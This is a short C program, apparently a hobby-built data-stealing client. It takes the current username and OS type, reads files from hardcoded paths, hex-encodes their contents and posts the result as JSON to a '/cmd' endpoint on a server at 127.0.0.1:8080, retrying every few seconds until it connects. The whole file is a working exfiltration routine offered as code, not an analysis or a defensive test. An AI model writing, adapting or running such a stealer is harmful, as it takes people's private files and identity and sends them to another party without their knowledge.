#include "extclib/crypto.h"
#include "extclib/net.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ADDRESS 	"127.0.0.1", 8080
#define NMAX_SIZE 	128
#define FMAX_READ 	6
#define FMAX_SIZE 	(5 << 20)
#define BUFSIZ_SUM 	(FMAX_READ * FMAX_SIZE + 256)

#define PARSE_FILES { \
	"/home/user/Documents/GOPROG/HES/client.go", \
	"/home/user/Documents/GOPROG/HES/server.go" \
}

typedef struct info_s {
	char os;
	char name[NMAX_SIZE];
	char fdata[FMAX_READ][FMAX_SIZE];
} info_s;

static void setjson(char *buffer, info_s *info);
static info_s *setinfo(info_s *info);

static int read_file(char *data, const char *filename);
static char *_strncpy(char *output, const char *input, size_t size);

static char buffer[BUFSIZ_SUM];
static info_s info;

int main(void) {
	net_conn *conn;
	setjson(buffer, setinfo(&info));

try_conn:
	conn = net_connect(ADDRESS);
	if (conn == NULL) {
		sleep(5);
		goto try_conn;
	}

	net_http_post(conn, "/cmd", buffer);
	net_close(conn);
	return 0;
}

static void setjson(char *buffer, info_s *info) {
	snprintf(buffer, BUFSIZ_SUM, 
		"{"
			"\"os\":%d,"
			"\"name\":\"%s\","
			"\"fdata\": ["
				"\"%s\","
				"\"%s\","
				"\"%s\","
				"\"%s\","
				"\"%s\","
				"\"%s\""
			"]"
		"}",
		info->os,
		info->name,
		info->fdata[0],
		info->fdata[1],
		info->fdata[2],
		info->fdata[3],
		info->fdata[4],
		info->fdata[5]
	);
}

static info_s *setinfo(info_s *info) {
	info->os = -1;
	_strncpy(info->name, "", NMAX_SIZE);
	for (size_t i = 0; i < FMAX_READ; ++i) {
		_strncpy(info->fdata[i], "", FMAX_SIZE);
	}
#ifdef __unix__
	info->os = 1;
	char *name = getenv("USER");
#elif _WIN32
	info->os = 2;
	char *name = getenv("USERNAME");
#endif
	if (name != NULL) {
		_strncpy(info->name, name, NMAX_SIZE);
	}
	const char *files[FMAX_READ] = PARSE_FILES;
	for (size_t i = 0; i < sizeof(files)/sizeof(files[0]); ++i) {
		read_file(info->fdata[i], files[i]);
	}
	return info;
}

static int read_file(char *data, const char *filename) {
	char bufferf[FMAX_SIZE/2];
	FILE *file = fopen(filename, "rb");
	if (file == NULL) {
		return 1;
	}
	size_t n = fread(bufferf, sizeof(char), FMAX_SIZE/2, file);
	crypto_hex(1, data, FMAX_SIZE, bufferf, n);
	return 0;
}

static char *_strncpy(char *output, const char *input, size_t size) {
	char *ret = strncpy(output, input, size-1);
	output[size-1] = '\0';
	return ret;
}
